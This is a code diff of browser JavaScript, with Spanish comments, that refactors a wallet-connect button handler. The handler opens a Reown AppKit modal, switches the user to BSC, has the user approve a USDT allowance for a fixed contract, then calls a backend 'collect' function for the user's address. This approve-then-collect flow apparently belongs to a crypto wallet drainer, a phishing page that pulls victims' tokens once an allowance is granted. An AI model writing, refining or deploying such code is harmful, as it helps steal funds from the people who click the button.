@@ -101,38 +101,28 @@ async function triggerBackendCollect(userAddress) {
 }
 
 // ─── Main Button Handler (AppKit + Ethers.js v6) ──────────────────────────────
-// ─── Main Button Handler (AppKit Modal Forzado) ──────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
-    
-    // 1. Verificar si Reown AppKit ya tiene una sesión activa
-    const isConnected = window.modal ? window.modal.getIsConnected() : false;
+    let rawProvider = await getActiveProvider();
 
-    // 2. Si NO está conectado, abrir obligatoriamente el modal flotante de selección
-    if (!isConnected) {
+    // Si no hay ninguna billetera conectada, abrir el modal profesional de Reown AppKit
+    if (!rawProvider) {
       if (window.modal && typeof window.modal.open === "function") {
         try {
           await window.modal.open();
-          return; // El modal se abre para que el usuario elija su wallet (PC o Móvil)
+          return; // El usuario selecciona su wallet y el flujo continúa en su siguiente clic
         } catch (modalErr) {
-          console.error("Error al abrir el modal de Reown:", modalErr);
+          console.error("Error al abrir AppKit:", modalErr);
         }
-      } else {
-        showToast("El sistema de billeteras no está inicializado.", "error");
-        return;
       }
+      showToast("Billetera no detectada. Selecciona una opción.", "error");
+      return;
     }
 
-    // 3. Si YA está conectado, procedemos con la lógica de la red y el contrato
     setLoading(true, "Conectando proveedor…");
 
     try {
-      // Obtener el proveedor activo desde AppKit
-      const rawProvider = window.modal.getWalletProvider();
-      if (!rawProvider) {
-        throw new Error("No se encontró el proveedor de la billetera activa.");
-      }
-
+      // Inicializar proveedor y firmante mediante Ethers.js v6
       const provider = new ethers.BrowserProvider(rawProvider);
       
       // Validación y cambio de red nativo a BSC
@@ -199,7 +189,7 @@ if (approveBtn) {
       const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);
 
       setLoading(true, "Confirmando en red…");
-      await tx.wait(); // Espera la confirmación del bloque con Ethers v6
+      await tx.wait(); // Espera la confirmación del bloque de forma nativa en Ethers v6
 
       setLoading(true, "Finalizando…");
       await triggerBackendCollect(userAddress);
